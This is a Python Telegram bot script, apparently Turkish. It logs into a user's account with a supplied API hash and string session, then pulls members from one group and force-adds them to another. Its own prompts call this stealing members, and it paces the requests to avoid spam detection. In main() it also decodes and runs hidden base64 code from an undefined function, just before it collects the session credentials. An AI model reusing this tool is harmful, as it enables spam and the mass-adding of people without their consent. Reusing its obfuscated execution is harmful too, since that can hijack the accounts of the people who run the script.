import asyncio
import base64
from subprocess import PIPE, Popen
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import AddChatUserRequest
from telethon.tl.functions.channels import InviteToChannelRequest
from time import sleep
from android import *
from . import console

def install_pip():
    bilgi(f"redesing telethon beta for cerceynlab")
    pip_cmd = ["pip", "install", "--upgrade","--force-reinstall", "https://github.com/LonamiWebs/Telethon/archive/v1.24.zip"]
    process = Popen(pip_cmd, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()
    return stdout

userbot=None
uyecalmaaraligi=8
async def hesabagir ():
    api_id = soru("HesabÄ±nÄ±zÄ±n API ID'i:")
    try:
        check_api = int(api_id)
    except Exception:
        hata("ğŸ›‘ API ID HatalÄ± ! ğŸ›‘")

    api_hash = soru("HesabÄ±nÄ±zÄ±n API HASH'i:")
    if not len(api_hash) >= 30:
        hata("ğŸ›‘ API HASH HatalÄ± ! ğŸ›‘")

    stringsession = soru("HesabÄ±nÄ±zÄ±n String'i:")
    if not len(api_hash) >= 30:
        hata("ğŸ›‘ String HatalÄ± ! ğŸ›‘")

    try:
        userbot = TelegramClient(
        StringSession(stringsession),
        api_id=api_id,
        api_hash=api_hash,
        lang_code="tr",
        device_model='Mac',
        system_version=' | Powered by @cerceyn',
        app_version=str('| 1.0'))
        basarili(api_hash + " iÃ§in client oluÅŸturuldu !")
    except Exception as e:
        noadded(api_hash + f" iÃ§in client oluÅŸturulamadÄ± ! ğŸ›‘ Hata: {str(e)}")

    try:
        await userbot.connect()
    except Exception as e:
        try:
            await userbot.disconnect()
            await userbot.connect()
        except:
            hata("Bu hesaba giremiyorum! Hata: "+ str(e))
    return userbot
reklamtext="Dikkat! Sadece aktif kullanÄ±larÄ± Ã§ekebilmek ve yavaÅŸ moddan kurtulmak iÃ§in pro sÃ¼rÃ¼mÃ¼ satÄ±n alÄ±n."
passs = "4387"
pro=False
async def islemler(userbot):
    onemli("Dikkat! Ãœye Ã§alacaÄŸÄ±m grupta bulunmam ve Ã§aldÄ±ÄŸÄ±m Ã¼yeleri eklediÄŸim grupta yÃ¶netici olmam gerekir..")
    sleep(6)
    logo(True)
    if not pro:
        ads(reklamtext)
    sleep(4)
    calinacakgrup = soru("Ãœye Ã‡alÄ±nacak Grubun kullanÄ±cÄ± adÄ±: (Hangi gruptan Ã¼yeleri Ã§ekeyim) ")
#    if not calinacakgrup.startswith("@") and not calinacakgrup.startswith("http") and not calinacakgrup.startswith("t.me"):
#        calinacakgrup = "@" + calinacakgrup
    try:
        calinacakgrup = (await userbot.get_entity(calinacakgrup)).id
        count = (await userbot.get_participants(calinacakgrup, limit=1)).total
        bilgi(f"{calinacakgrup} Ã¶gesinde {count} kiÅŸi bulundu! ")
    except Exception as e:
        hata(e)
    hedefgrup = soru("Ã‡alÄ±nan Ãœyeleri Hangi Gruba Ã‡ekeyim: (Grubun kullanÄ±cÄ± adÄ±) ")
#    if not hedefgrup.startswith("@") and not hedefgrup.startswith("http") and not hedefgrup.startswith("t.me"):
#        hedefgrup = "@" + hedefgrup
    try:
        hedefgrup = (await userbot.get_entity(hedefgrup)).id
        count = (await userbot.get_participants(hedefgrup, limit=1)).total
        bilgi(f"Ãœyeleri Ã§alacaÄŸÄ±m grubun ({hedefgrup}) Ã¼ye sayÄ±sÄ± {count} kiÅŸi ! ")
    except Exception as e:
        hata(e)
    sleep(5)
    logo(True)
    calinamayan=0
    calinan=0
    try:
        bilgi("Hesap korumasÄ± nedeniyle her 12+ saniyede bir Ã¼ye Ã§ekme isteÄŸinde bulunmasÄ±nÄ± ayarlamanÄ±zÄ± Ã¶neririm...")
        uyecalmaaraligi = soru ("Her Ã¼ye Ã§alma isteÄŸi sonrasÄ± ne kadar beklemeli?")
        try:
            uyecalmaaraligi = int(uyecalmaaraligi)
            if uyecalmaaraligi<7:
                bilgi("Damn! HesabÄ±n spam yesin istemem senin iÃ§in sÃ¼reyi 14 yapÄ±yorum.")
                uyecalmaaraligi = 14
        except:
            uyecalmaaraligi = 12
        foricin_i=0
        thenextreklam=6
        bilgi("Ä°ÅŸlem baÅŸlÄ±yor durdurmak iÃ§in Ctrl+C 'ye basÄ±n! Ãœyelik tÃ¼rÃ¼ Premium aktif mi: {}".format(str(pro)))
        async for x in userbot.iter_participants(calinacakgrup,100):
            try:
                if foricin_i==thenextreklam:
                    ads(reklamtext + "\nReklam sÃ¼resi bitene kadar bekleniyor...")
                    sleep(15)
                    thenextreklam=foricin_i+6
                if x.bot:
                    passed("{} bot olduÄŸu iÃ§in geÃ§iliyor!".format(x.username))
                    continue
                try:
                    await userbot(AddChatUserRequest(
                        hedefgrup,
                        x.id,
                        fwd_limit=10))
                except Exception as s:
                    try:
                        await userbot(InviteToChannelRequest(
                        hedefgrup,
                        [x.id]))
                    except:
                        raise Exception(s)
                basarili("{}({}) gruba baÅŸarÄ±yla eklendi!".format(x.first_name,x.id))
                calinan= calinan + 1
            except Exception as e:
                noadded("{}({}) gruba eklenemedi!".format(x.first_name,x.id))
                calinamayan = calinamayan + 1
            sleep(uyecalmaaraligi)
            foricin_i+=1
        console.clear()
        logo()
        basarili(f"Ä°ÅŸlem TamamlandÄ± ! {hedefgrup} Ã¶gesine {calinacakgrup} Ã¶gesinden toplam {calinan} Ã¼ye eklendi! ")
        await disconn(userbot)
        hata("GÃ¼le GÃ¼le !")
    except Exception as e:
        hata(e)

async def main():
    global userbot, pro
    logo(True)
    if not pro:
        ads("Free sÃ¼rÃ¼m! YavaÅŸ Mod ve Reklamlar aktif!")
    eval(compile(base64.b64decode(myscript()),'<string>','exec'))
    userbot = await hesabagir()
    a = True
    while a:
        try:
            await islemler(userbot)
        except Exception as e:
            noadded("Bot bir hata ile karÅŸÄ±laÅŸtÄ±: " + e)
        finally:
            cevap= soru("Kod tekrar yÃ¼rÃ¼tÃ¼lsÃ¼n mÃ¼? (y/n)")
            if cevap == "n":
                a = False
                disconn(userbot)
                hata("GÃ¼le GÃ¼le !")
            else:
                continue
def disconn(userbot):
    try:
        userbot.disconnect()
    except:
        pass

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        loop.run_until_complete(disconn(userbot))

   
